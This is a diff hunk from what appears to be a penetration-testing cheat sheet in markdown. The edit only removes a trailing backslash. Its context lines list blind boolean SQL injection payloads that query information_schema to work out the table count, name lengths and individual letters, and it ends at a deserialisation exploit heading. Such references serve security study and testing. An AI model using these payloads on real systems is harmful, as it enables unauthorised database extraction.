@@ -484,7 +484,7 @@ Check for how many table there are in the database: ```' and (select count(*) fr
 Check for the length of the first table: ```' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 7 -- - ``` \
 Check for the length of the second table: ```' and (length((select table_name from information_schema.tables where table_schema=database() limit 2,1))) = 7 -- - ``` \
 Check for the first letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 'p' -- -``` \
-Check for the second letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)) = 'r' -- -``` \
+Check for the second letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)) = 'r' -- -``` 
 
 
 ## Serilisation/Deserialisation Exploit
